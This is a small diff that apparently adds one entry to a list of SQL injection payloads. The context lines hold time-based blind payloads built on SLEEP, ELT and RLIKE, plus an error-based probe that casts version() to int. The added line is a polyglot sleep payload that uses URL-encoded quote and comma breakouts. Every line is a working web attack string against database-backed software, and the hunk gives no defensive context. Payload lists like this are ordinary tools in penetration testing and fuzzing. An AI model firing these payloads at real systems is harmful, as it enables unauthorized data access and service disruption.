@@ -174,3 +174,4 @@ RLIKE SLEEP(20)--
 `) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20))-- 1337
 1`=`1` AND ELT(1337=1337,SLEEP(20)) AND `1`=`1
 %6c%75%33%6b%79%31%33' AND 1=CAST((SELECT version()) AS int) --
+(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
